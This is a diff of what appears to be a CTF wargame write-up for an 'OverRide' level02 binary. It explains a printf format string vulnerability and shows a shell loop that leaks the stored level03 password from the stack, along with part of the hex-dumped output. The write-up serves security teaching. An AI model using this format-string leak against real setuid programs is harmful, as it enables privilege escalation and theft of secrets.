@@ -30,15 +30,17 @@ level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dyna
 ```
 It contains only one user defined function `main()`
 
-Executable open a `.pass` file of `level03` and read 41 bytes of data from the stream pointed to by the `fd`, storing them at the location given by first pointer to `buff`.
-It replace last character `\n` with `\0` and check that letght of buffer is equal to 41.
+Executable open a `.pass` file of `level03` and read 41 bytes of data from the stream pointed to by the `fd`, storing them at the location given by first pointer to `buff`. It replace last character `\n` with `\0` and check that letght of buffer is equal to 41.
+
 Then, it invite user to input username and password. So it reads in at most one less than 100 characters from `stdin` and stores them into the buffer pointed to by `username` and `password`. Once input is entered it replace `\n` with `\0`.
 
 Finally, it compares user's password to password read from the file. If it match, it open a new process runnign a shell.
 In case if password do not match, it ouputs username and message that it _does not have access!_.
+
 Here `printf()` is ussed is such way that input string is evaluated as a command by the application, which is know as [Format string attack](https://owasp.org/www-community/attacks/Format_string_attack). As the password still in the memory, it can be retrieved by passing to `printf()` a conversion specifier `%x`.
 
-As password is stored in the buffer and FSA can be performed, read the stack using long conversion specifier `%lx`.
+As password is stored in the buffer and FSA can be performed, read the stack using long conversion specifier `%lx` (as binary is an 64-bytes).
+
 ```shell
 level02@OverRide:~$ for i in {0..26}; do python -c "print('%$i\$16lx')" | ./level02 | grep -oE '[a-f0-9]{16}' | tr '\n' ' '; done; echo
 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 
